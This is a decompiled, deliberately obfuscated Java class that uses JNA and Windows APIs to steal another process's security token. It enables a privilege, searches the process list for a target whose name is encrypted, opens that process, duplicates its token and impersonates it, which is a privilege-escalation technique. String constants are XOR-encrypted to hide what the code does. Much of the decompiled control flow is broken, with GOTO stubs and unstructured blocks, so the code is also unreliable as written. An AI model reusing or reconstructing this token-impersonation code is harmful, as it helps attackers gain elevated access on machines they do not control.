/*
 * Decompiled with CFR 0.152.
 */
package a.b.c.g;

import a.b.c.f.u;
import a.b.c.g.e;
import a.b.c.g.g;
import a.b.c.g.o;
import a.b.c.g.s5;
import com.sun.jna.Native;
import com.sun.jna.platform.win32.Advapi32;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.Tlhelp32;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.ptr.ByteByReference;
import java.lang.invoke.MethodHandles;

class uw {
    private WinNT.HANDLE J;
    private WinNT.HANDLE F;
    private boolean E = false;
    private byte X;
    private static final String n;
    private static final long[] d;
    private static final Integer[] z;
    private static final long a;

    private uw() {
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Unable to fully structure code
     */
    public void start() throws Exception {
        block157: {
            block149: {
                block150: {
                    block148: {
                        block175: {
                            block146: {
                                block147: {
                                    block173: {
                                        block144: {
                                            block141: {
                                                block139: {
                                                    block140: {
                                                        block138: {
                                                            block136: {
                                                                block137: {
                                                                    block129: {
                                                                        block128: {
                                                                            block127: {
                                                                                block158: {
                                                                                    block126: {
                                                                                        var1_1 = uw.a ^ 120735953485471L;
                                                                                        var3_2 = var1_1 ^ 99357524284653L;
                                                                                        var7_3 = new ByteByReference();
                                                                                        var6_4 = g.i();
                                                                                        var8_5 = e.INSTANCE.RtlAdjustPrivilege(uw.A(24282, 3043869888450230078L), true, false, var7_3);
                                                                                        var5_6 = g.R();
                                                                                        if (var6_4 != null) break block158;
                                                                                        try {
                                                                                            block159: {
                                                                                                if (var8_5 == 0) break block126;
                                                                                                break block159;
                                                                                                catch (Exception v0) {
                                                                                                    throw uw.W(v0);
                                                                                                }
                                                                                            }
                                                                                            throw new Exception();
                                                                                        }
                                                                                        catch (Exception v1) {
                                                                                            throw uw.W(v1);
                                                                                        }
                                                                                    }
                                                                                    this.E = true;
                                                                                    this.X = var7_3.getValue();
                                                                                }
                                                                                var9_7 = new Tlhelp32.PROCESSENTRY32.ByReference();
                                                                                var10_8 = Kernel32.INSTANCE.CreateToolhelp32Snapshot(Tlhelp32.TH32CS_SNAPPROCESS, new WinDef.DWORD(0L));
                                                                                if (var6_4 != null) break block127;
                                                                                try {
                                                                                    block160: {
                                                                                        if (var10_8 != WinNT.INVALID_HANDLE_VALUE) break block128;
                                                                                        break block160;
                                                                                        catch (Exception v2) {
                                                                                            throw uw.W(v2);
                                                                                        }
                                                                                    }
                                                                                    this.L(var3_2);
                                                                                }
                                                                                catch (Exception v3) {
                                                                                    throw uw.W(v3);
                                                                                }
                                                                            }
                                                                            throw new Exception();
                                                                        }
                                                                        try {
                                                                            while (Kernel32.INSTANCE.Process32Next(var10_8, var9_7)) {
                                                                                block131: {
                                                                                    block133: {
                                                                                        block134: {
                                                                                            block135: {
                                                                                                block167: {
                                                                                                    block132: {
                                                                                                        block165: {
                                                                                                            block164: {
                                                                                                                block163: {
                                                                                                                    block130: {
                                                                                                                        block161: {
                                                                                                                            var11_9 = Native.toString(var9_7.szExeFile);
                                                                                                                            try {
                                                                                                                                if (var5_6 == null) break block129;
                                                                                                                                v4 = uw.n.equalsIgnoreCase((String)var11_9);
                                                                                                                                if (var6_4 != null) break block129;
                                                                                                                            }
                                                                                                                            catch (Exception v5) {
                                                                                                                                throw uw.b(v5);
                                                                                                                            }
                                                                                                                            if (var6_4 != null) break block130;
                                                                                                                            break block161;
                                                                                                                            catch (Exception v6) {
                                                                                                                                throw uw.W(v6);
                                                                                                                            }
                                                                                                                        }
                                                                                                                        try {
                                                                                                                            block162: {
                                                                                                                                if (!v4) break block131;
                                                                                                                                break block162;
                                                                                                                                catch (Exception v7) {
                                                                                                                                    throw uw.W(v7);
                                                                                                                                }
                                                                                                                            }
                                                                                                                            v8 = var9_7.th32ProcessID.intValue();
                                                                                                                        }
                                                                                                                        catch (Exception v9) {
                                                                                                                            throw uw.W(v9);
                                                                                                                        }
                                                                                                                    }
                                                                                                                    var12_10 = v8;
                                                                                                                    try {
                                                                                                                        v10 = this.J = Kernel32.INSTANCE.OpenProcess(uw.A(26694, 665510419331826087L), false, (int)var12_10);
                                                                                                                        if (var5_6 == null || var6_4 != null) break block132;
                                                                                                                    }
                                                                                                                    catch (Exception v11) {
                                                                                                                        throw uw.b(v11);
                                                                                                                    }
                                                                                                                    if (v10 == null) ** GOTO lbl94
                                                                                                                    break block163;
                                                                                                                    catch (Exception v12) {
                                                                                                                        throw uw.W(v12);
                                                                                                                    }
                                                                                                                }
                                                                                                                v10 = this.J;
                                                                                                                if (var6_4 != null) break block133;
                                                                                                                break block164;
                                                                                                                catch (Exception v13) {
                                                                                                                    throw uw.W(v13);
                                                                                                                }
                                                                                                            }
                                                                                                            if (v10 != WinNT.INVALID_HANDLE_VALUE) break block134;
                                                                                                            break block165;
                                                                                                            catch (Exception v14) {
                                                                                                                throw uw.W(v14);
                                                                                                            }
                                                                                                        }
                                                                                                        try {
                                                                                                            block166: {
                                                                                                                this.J = Kernel32.INSTANCE.OpenProcess(uw.A(30346, 4619908951939112808L), false, (int)var12_10);
                                                                                                                v15 = this;
                                                                                                                if (var6_4 != null) break block135;
                                                                                                                break block166;
                                                                                                                catch (Exception v16) {
                                                                                                                    throw uw.W(v16);
                                                                                                                }
                                                                                                            }
                                                                                                            v10 = v15.J;
                                                                                                        }
                                                                                                        catch (Exception v17) {
                                                                                                            throw uw.W(v17);
                                                                                                        }
                                                                                                    }
                                                                                                    try {
                                                                                                        if (var5_6 == null) ** GOTO lbl118
                                                                                                        if (v10 != null) {
                                                                                                        }
                                                                                                        ** GOTO lbl128
                                                                                                    }
                                                                                                    catch (Exception v18) {
                                                                                                        throw uw.b(v18);
                                                                                                    }
                                                                                                    v10 = this.J;
lbl118:
                                                                                                    // 2 sources

                                                                                                    if (var6_4 != null) break block133;
                                                                                                    break block167;
                                                                                                    catch (Exception v19) {
                                                                                                        throw uw.W(v19);
                                                                                                    }
                                                                                                }
                                                                                                try {
                                                                                                    block168: {
                                                                                                        if (v10 != WinNT.INVALID_HANDLE_VALUE) break block134;
                                                                                                        break block168;
                                                                                                        catch (Exception v20) {
                                                                                                            throw uw.W(v20);
                                                                                                        }
                                                                                                    }
                                                                                                    v15 = this;
                                                                                                }
                                                                                                catch (Exception v21) {
                                                                                                    throw uw.W(v21);
                                                                                                }
                                                                                            }
                                                                                            v15.J = null;
                                                                                        }
                                                                                        v10 = this.J;
                                                                                    }
                                                                                    if (v10 != null) ** break;
                                                                                }
                                                                                if (var6_4 == null) continue;
                                                                            }
                                                                        }
                                                                        catch (Throwable var13_12) {
                                                                            Kernel32.INSTANCE.CloseHandle(var10_8);
                                                                            throw var13_12;
                                                                        }
                                                                        try {
                                                                            if (var5_6 == null) ** GOTO lbl151
                                                                            v4 = Kernel32.INSTANCE.CloseHandle(var10_8);
                                                                        }
                                                                        catch (Exception v22) {
                                                                            throw uw.b(v22);
                                                                        }
                                                                    }
                                                                    try {
                                                                        if (var5_6 == null) break block136;
                                                                        v23 = this;
                                                                        if (var6_4 != null) break block137;
                                                                    }
                                                                    catch (Exception v24) {
                                                                        throw uw.b(v24);
                                                                    }
                                                                    try {
                                                                        block169: {
                                                                            if (v23.J != null) break block138;
                                                                            break block169;
                                                                            catch (Exception v25) {
                                                                                throw uw.W(v25);
                                                                            }
                                                                        }
                                                                        v23 = this;
                                                                    }
                                                                    catch (Exception v26) {
                                                                        throw uw.W(v26);
                                                                    }
                                                                }
                                                                v23.L(var3_2);
                                                            }
                                                            throw new Exception();
                                                        }
                                                        var11_9 = new WinNT.HANDLEByReference();
                                                        try {
                                                            if (var5_6 == null) break block139;
                                                            v27 = Advapi32.INSTANCE.OpenProcessToken(this.J, uw.A(13262, 4423051279580764717L), (WinNT.HANDLEByReference)var11_9);
                                                            if (var6_4 != null) break block140;
                                                        }
                                                        catch (Exception v28) {
                                                            throw uw.b(v28);
                                                        }
                                                        try {
                                                            block170: {
                                                                if (v27) break block141;
                                                                break block170;
                                                                catch (Exception v29) {
                                                                    throw uw.W(v29);
                                                                }
                                                            }
                                                            v27 = Kernel32.INSTANCE.CloseHandle(this.J);
                                                        }
                                                        catch (Exception v30) {
                                                            throw uw.W(v30);
                                                        }
                                                    }
                                                    this.J = null;
                                                    this.L(var3_2);
                                                }
                                                throw new Exception();
                                            }
                                            var12_11 = new WinNT.HANDLEByReference();
                                            try {
                                                block145: {
                                                    block142: {
                                                        block143: {
                                                            try {
                                                                v31 = Advapi32.INSTANCE.DuplicateToken(var11_9.getValue(), 2, var12_11);
                                                                v32 = var6_4;
                                                                if (var5_6 != null) {
                                                                    if (v32 != null) break block142;
                                                                }
                                                                ** GOTO lbl231
                                                            }
                                                            catch (Exception v33) {
                                                                throw uw.b(v33);
                                                            }
                                                            try {
                                                                block171: {
                                                                    if (v31) break block143;
                                                                    break block171;
                                                                    catch (Exception v34) {
                                                                        throw uw.W(v34);
                                                                    }
                                                                }
                                                                throw new Exception();
                                                            }
                                                            catch (Exception v35) {
                                                                throw uw.W(v35);
                                                            }
                                                        }
                                                        v31 = Advapi32.INSTANCE.ImpersonateLoggedOnUser(var12_11.getValue());
                                                    }
                                                    try {
                                                        if (var5_6 == null) break block144;
                                                        v32 = var6_4;
                                                    }
                                                    catch (Exception v36) {
                                                        throw uw.b(v36);
                                                    }
lbl231:
                                                    // 2 sources

                                                    if (v32 != null) break block144;
                                                    try {
                                                        block172: {
                                                            if (v31) break block145;
                                                            break block172;
                                                            catch (Exception v37) {
                                                                throw uw.W(v37);
                                                            }
                                                        }
                                                        Kernel32.INSTANCE.CloseHandle(var12_11.getValue());
                                                        throw new Exception();
                                                    }
                                                    catch (Exception v38) {
                                                        throw uw.W(v38);
                                                    }
                                                }
                                                this.F = var12_11.getValue();
                                                v31 = Kernel32.INSTANCE.CloseHandle(var11_9.getValue());
                                            }
                                            catch (Throwable var14_13) {
                                                block155: {
                                                    block156: {
                                                        block154: {
                                                            block151: {
                                                                block152: {
                                                                    try {
                                                                        try {
                                                                            block153: {
                                                                                try {
                                                                                    try {
                                                                                        Kernel32.INSTANCE.CloseHandle(var11_9.getValue());
                                                                                        v39 = this.F;
                                                                                        if (var6_4 != null) break block151;
                                                                                        if (v39 != null) break block152;
                                                                                    }
                                                                                    catch (Exception v40) {
                                                                                        throw uw.W(v40);
                                                                                    }
                                                                                    try {
                                                                                        v39 = var12_11.getValue();
                                                                                        v41 = var6_4;
                                                                                        if (var5_6 != null) {
                                                                                            if (v41 != null) break block151;
                                                                                            break block153;
                                                                                        }
                                                                                        ** GOTO lbl292
                                                                                    }
                                                                                    catch (Exception v42) {
                                                                                        throw uw.b(v42);
                                                                                    }
                                                                                }
                                                                                catch (Exception v43) {
                                                                                    throw uw.W(v43);
                                                                                }
                                                                            }
                                                                            if (v39 == null) break block152;
                                                                        }
                                                                        catch (Exception v44) {
                                                                            throw uw.W(v44);
                                                                        }
                                                                        Kernel32.INSTANCE.CloseHandle(var12_11.getValue());
                                                                    }
                                                                    catch (Exception v45) {
                                                                        throw uw.W(v45);
                                                                    }
                                                                }
                                                                v39 = this.F;
                                                            }
                                                            try {
                                                                try {
                                                                    try {
                                                                        try {
                                                                            if (var5_6 == null) break block154;
                                                                            v41 = var6_4;
                                                                        }
                                                                        catch (Exception v46) {
                                                                            throw uw.b(v46);
                                                                        }
lbl292:
                                                                        // 2 sources

                                                                        if (v41 != null) break block154;
                                                                        if (v39 != null) break block155;
                                                                    }
                                                                    catch (Exception v47) {
                                                                        throw uw.W(v47);
                                                                    }
                                                                    v48 = this;
                                                                    if (var6_4 != null) break block156;
                                                                }
                                                                catch (Exception v49) {
                                                                    throw uw.W(v49);
                                                                }
                                                                v39 = v48.J;
                                                            }
                                                            catch (Exception v50) {
                                                                throw uw.W(v50);
                                                            }
                                                        }
                                                        try {
                                                            if (v39 != null) {
                                                                Kernel32.INSTANCE.CloseHandle(this.J);
                                                            }
                                                        }
                                                        catch (Exception v51) {
                                                            throw uw.W(v51);
                                                        }
                                                        this.J = null;
                                                        v48 = this;
                                                    }
                                                    v48.L(var3_2);
                                                }
                                                throw var14_13;
                                            }
                                        }
                                        v52 = this.F;
                                        if (var6_4 != null) break block146;
                                        if (v52 != null) break block147;
                                        break block173;
                                        catch (Exception v53) {
                                            throw uw.W(v53);
                                        }
                                    }
                                    try {
                                        v52 = var12_11.getValue();
                                        v54 = var6_4;
                                        if (var5_6 != null) {
                                            if (v54 == null) {
                                            }
                                            break block146;
                                        }
                                        ** GOTO lbl364
                                    }
                                    catch (Exception v55) {
                                        throw uw.b(v55);
                                    }
                                    catch (Exception v56) {
                                        throw uw.W(v56);
                                    }
                                    try {
                                        block174: {
                                            if (v52 == null) break block147;
                                            break block174;
                                            catch (Exception v57) {
                                                throw uw.W(v57);
                                            }
                                        }
                                        Kernel32.INSTANCE.CloseHandle(var12_11.getValue());
                                    }
                                    catch (Exception v58) {
                                        throw uw.W(v58);
                                    }
                                }
                                v52 = this.F;
                            }
                            try {
                                if (var5_6 == null) break block148;
                                v54 = var6_4;
                            }
                            catch (Exception v59) {
                                throw uw.b(v59);
                            }
lbl364:
                            // 2 sources

                            if (v54 != null) break block148;
                            if (v52 != null) break block149;
                            break block175;
                            catch (Exception v60) {
                                throw uw.W(v60);
                            }
                        }
                        try {
                            try {
                                if (var5_6 == null) break block149;
                                v61 = this;
                                if (var6_4 == null) {
                                }
                                break block150;
                            }
                            catch (Exception v62) {
                                throw uw.b(v62);
                            }
                            catch (Exception v63) {
                                throw uw.W(v63);
                            }
                            v52 = v61.J;
                        }
                        catch (Exception v64) {
                            throw uw.W(v64);
                        }
                    }
                    try {
                        if (v52 != null) {
                            Kernel32.INSTANCE.CloseHandle(this.J);
                        }
                    }
                    catch (Exception v65) {
                        throw uw.W(v65);
                    }
                    this.J = null;
                    v61 = this;
                }
                v61.L(var3_2);
            }
            try {
                if (var5_6 == null) break block157;
                try {
                    block176: {
                        if (u.b() == null) break block157;
                        break block176;
                        catch (Exception v66) {
                            throw uw.b(v66);
                        }
                    }
                    g.b(new String[2]);
                }
                catch (Exception v67) {
                    throw uw.b(v67);
                }
            }
            catch (Exception v68) {
                throw uw.W(v68);
            }
        }
        try {
            if (var5_6 == null) {
                u.g(new String[3]);
            }
        }
        catch (Exception v69) {
            throw uw.b(v69);
        }
    }

    private void L(long l2) {
        block4: {
            boolean bl;
            int n2;
            e e2;
            ByteByReference byteByReference;
            block2: {
                block3: {
                    l2 = a ^ l2;
                    String[] stringArray = g.i();
                    if (!this.E) break block4;
                    byteByReference = new ByteByReference();
                    try {
                        e2 = e.INSTANCE;
                        n2 = uw.A(10419, 4527333257475195219L);
                        bl = this.X;
                        if (stringArray != null) break block2;
                        if (!bl) break block3;
                    }
                    catch (RuntimeException runtimeException) {
                        throw uw.W(runtimeException);
                    }
                    bl = true;
                    break block2;
                }
                bl = false;
            }
            e2.RtlAdjustPrivilege(n2, bl, false, byteByReference);
            this.E = false;
        }
    }

    public void close() {
        block15: {
            uw uw2;
            long l2;
            block16: {
                WinNT.HANDLE hANDLE;
                block13: {
                    String[] stringArray;
                    String[] stringArray2;
                    block14: {
                        long l3 = a ^ 0x7D5CF654113EL;
                        l2 = l3 ^ 0x4ACE883ABB4CL;
                        String[] stringArray3 = g.R();
                        String[] stringArray4 = g.i();
                        Advapi32.INSTANCE.RevertToSelf();
                        stringArray2 = stringArray4;
                        stringArray = stringArray3;
                        try {
                            try {
                                try {
                                    hANDLE = this.F;
                                    if (stringArray == null || stringArray2 != null) break block13;
                                }
                                catch (RuntimeException runtimeException) {
                                    throw uw.b(runtimeException);
                                }
                                if (hANDLE == null) break block14;
                            }
                            catch (RuntimeException runtimeException) {
                                throw uw.W(runtimeException);
                            }
                            Kernel32.INSTANCE.CloseHandle(this.F);
                            this.F = null;
                        }
                        catch (RuntimeException runtimeException) {
                            throw uw.W(runtimeException);
                        }
                    }
                    try {
                        try {
                            if (stringArray == null) break block15;
                            uw2 = this;
                            if (stringArray2 != null) break block16;
                        }
                        catch (RuntimeException runtimeException) {
                            throw uw.b(runtimeException);
                        }
                        hANDLE = uw2.J;
                    }
                    catch (RuntimeException runtimeException) {
                        throw uw.W(runtimeException);
                    }
                }
                try {
                    if (hANDLE != null) {
                        Kernel32.INSTANCE.CloseHandle(this.J);
                        this.J = null;
                    }
                }
                catch (RuntimeException runtimeException) {
                    throw uw.W(runtimeException);
                }
                uw2 = this;
            }
            uw2.L(l2);
        }
    }

    uw(o o2) {
        this();
    }

    private static Exception W(Exception exception) {
        return exception;
    }

    /*
     * Unable to fully structure code
     */
    static {
        block24: {
            block23: {
                block22: {
                    block25: {
                        break block25;
lbl1:
                        // 1 sources

                        while (true) {
                            continue;
                            break;
                        }
                    }
                    uw.a = s5.a(1261514159864128259L, 7500944935385322435L, MethodHandles.lookup().lookupClass()).a(144667688085768L);
                    v0 = "N;\u0000\u0017YC\u001aZ-".toCharArray();
                    v1 = v0.length;
                    var8 = 0;
                    try {
                        v2 = 118;
                        v3 = v0;
                        v4 = v1;
                        if (v1 > 1) break block22;
lbl17:
                        // 2 sources

                        while (true) {
                            v5 = v2;
                            v3 = v3;
                            v6 = v3;
                            v7 = v2;
                            v8 = var8;
                            break;
                        }
                    }
                    catch (RuntimeException v9) {
                        throw uw.b(v9);
                    }
                    while (true) {
                        switch (var8 % 7) {
                            case 0: {
                                v10 = 84;
                                break;
                            }
                            case 1: {
                                v10 = 62;
                                break;
                            }
                            case 2: {
                                v10 = 23;
                                break;
                            }
                            case 3: {
                                v10 = 18;
                                break;
                            }
                            case 4: {
                                v10 = 92;
                                break;
                            }
                            case 5: {
                                v10 = 27;
                                break;
                            }
                            default: {
                                v10 = 9;
                            }
                        }
                        try {
                            v6[v8] = (char)(v6[v8] ^ (v7 ^ v10));
                            ++var8;
                            v2 = v5;
                            if (v5 != 0) break;
                            v5 = v2;
                            v3 = v3;
                            v8 = v2;
                            v6 = v3;
                            v7 = v2;
                        }
                        catch (RuntimeException v11) {
                            throw uw.b(v11);
                        }
                    }
                }
                v12 = v3;
                v4 = v4;
                ** while (v4 > var8)
lbl68:
                // 1 sources

                ** while (true)
                uw.n = new String(v12).intern();
                var0_1 = 5210182722807989743L;
                var6_2 = new long[5];
                var3_3 = 0;
                var4_4 = "]\u001b\u00cc}\u00b8F\u0004\u00a8\u00b9\u00d6\u008a\u0080\u00adATH7\u00f2\u0013\u00fb\u0001#^\u0087";
                var5_5 = "]\u001b\u00cc}\u00b8F\u0004\u00a8\u00b9\u00d6\u008a\u0080\u00adATH7\u00f2\u0013\u00fb\u0001#^\u0087".length();
                var2_6 = 0;
                while (true) {
                    var7_7 = var4_4.substring(var2_6, var2_6 += 8).getBytes("ISO-8859-1");
                    v13 = var6_2;
                    v14 = var3_3++;
                    v15 = ((long)var7_7[0] & 255L) << 56 | ((long)var7_7[1] & 255L) << 48 | ((long)var7_7[2] & 255L) << 40 | ((long)var7_7[3] & 255L) << 32 | ((long)var7_7[4] & 255L) << 24 | ((long)var7_7[5] & 255L) << 16 | ((long)var7_7[6] & 255L) << 8 | (long)var7_7[7] & 255L;
                    v16 = -1;
                    break block23;
                    break;
                }
lbl86:
                // 1 sources

                while (true) {
                    v13[v14] = v17;
                    if (var2_6 < var5_5) ** continue;
                    var4_4 = "au\u00e8@\u00b1f\u009f\u00c8|'\u00e3_\u00b4Lr\u00c5";
                    var5_5 = "au\u00e8@\u00b1f\u009f\u00c8|'\u00e3_\u00b4Lr\u00c5".length();
                    var2_6 = 0;
                    while (true) {
                        var7_7 = var4_4.substring(var2_6, var2_6 += 8).getBytes("ISO-8859-1");
                        v13 = var6_2;
                        v14 = var3_3++;
                        v15 = ((long)var7_7[0] & 255L) << 56 | ((long)var7_7[1] & 255L) << 48 | ((long)var7_7[2] & 255L) << 40 | ((long)var7_7[3] & 255L) << 32 | ((long)var7_7[4] & 255L) << 24 | ((long)var7_7[5] & 255L) << 16 | ((long)var7_7[6] & 255L) << 8 | (long)var7_7[7] & 255L;
                        v16 = 0;
                        break block23;
                        break;
                    }
                    break;
                }
lbl99:
                // 1 sources

                while (true) {
                    v13[v14] = v17;
                    if (var2_6 < var5_5) ** continue;
                    break block24;
                    break;
                }
            }
            v17 = v15 ^ var0_1;
            switch (v16) {
                default: {
                    ** continue;
                }
                ** case 0:
lbl110:
                // 1 sources

                ** continue;
            }
        }
        uw.d = var6_2;
        uw.z = new Integer[5];
    }

    private static int A(int n2, long l2) {
        Integer n3;
        block4: {
            int n4;
            block5: {
                String[] stringArray = g.R();
                n4 = n2 ^ (int)(l2 & 0x7FFFL) ^ 0x29E0;
                try {
                    try {
                        n3 = z[n4];
                        if (stringArray == null) break block4;
                        if (n3 != null) break block5;
                    }
                    catch (RuntimeException runtimeException) {
                        throw uw.b(runtimeException);
                    }
                    uw.z[n4] = (int)(d[n4] ^ l2);
                }
                catch (RuntimeException runtimeException) {
                    throw uw.b(runtimeException);
                }
            }
            n3 = z[n4];
        }
        return n3;
    }

    private static Exception b(Exception exception) {
        return exception;
    }
}

